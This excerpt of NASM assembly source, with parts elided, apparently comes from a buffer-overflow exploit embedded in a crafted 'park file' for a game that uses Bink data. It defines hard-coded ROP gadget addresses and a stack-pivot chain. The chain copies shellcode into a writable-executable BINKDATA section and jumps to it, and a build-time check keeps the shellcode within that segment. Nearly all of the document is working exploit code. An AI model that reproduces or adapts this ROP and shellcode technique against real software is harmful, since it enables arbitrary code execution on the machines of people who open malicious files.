...
%macro HACK_FUNCTION 1
    %define %1          ShellCodeCopyDstAddress + (_%1 - shell_code_start)
%endmacro
...
; ROP chain gadgets
%define ROP_PopEax                      0002B1E9h   ; pop eax # ret
%define ROP_PopEcx                      0018DFC5h   ; pop ecx # ret
...
%define ROPGadget2                      ROP_PopEax  ; pop eax # ret
%define ROPGadget3                      0018BB42h   ; mov [eax], esi # pop esi # ret
%define ROPGadget4                      ROP_PopEcx  ; pop ecx # ret
%define ROPGadget5                      ROP_PopEax  ; pop eax # ret
%define ROPGadget6                      001117E0h   ; 

%define ShellCodeCopyDstAddress         002F80A0h   ; Address of the BINKDATA section which is RWX
%define ShellCodeMaxCopySize            0000F650h   ; Size of the BINKDATA section used to ensure our shell code doesn't overflow the segment
...
stack_pivot:
        ...
        ; Gadget 2 - get address to save stack pointer to
            ...
            ; ret
            dd      CompressedMapBufferAddress + (_Hack_OldStackPointer - _buffer_overflow_start) + 1872    ; Location in park file to save stack pointer to
        ...
        ; Gadget 4 - load destination address for shell code copy
            ; pop   ecx             ; ShellCodeCopyDstAddress
            ; ret
            dd      ShellCodeCopyDstAddress
            dd      ROPGadget5      ; Next gadget address

        ; Gadget 5 - load source address for shell code copy
            ; pop   eax             ; shell_code_start
            ; ret
            dd      CompressedMapBufferAddress + (shell_code_start - _buffer_overflow_start) + 1872     ; eax
            dd      ROPGadget6      ; Next gadget address

        ; Gadget 6 - copy shell code to executable memory
            ; pop     edx           ; size of shell code / 4
            ; sub     ecx, eax
            ; push    esi
            ;
            ; loc_1117E4:
            ...
            ;   add     eax, 4
            ;   dec     edx
            ;   jnz     short loc_1117E4
            ;
            ; pop     esi
            ; retn
            dd      ((_buffer_overflow_end - shell_code_start) + 3) / 4     ; edx
            dd      ShellCodeCopyDstAddress                                 ; return address
...
; Safety cehck to make sure we don't overflow the segment we copy the shell code into.
%if (_buffer_overflow_end - shell_code_start) > ShellCodeMaxCopySize
    %error "Shell code is too large for copy segment, decrease shell code size or find a new copy location!"
%endif
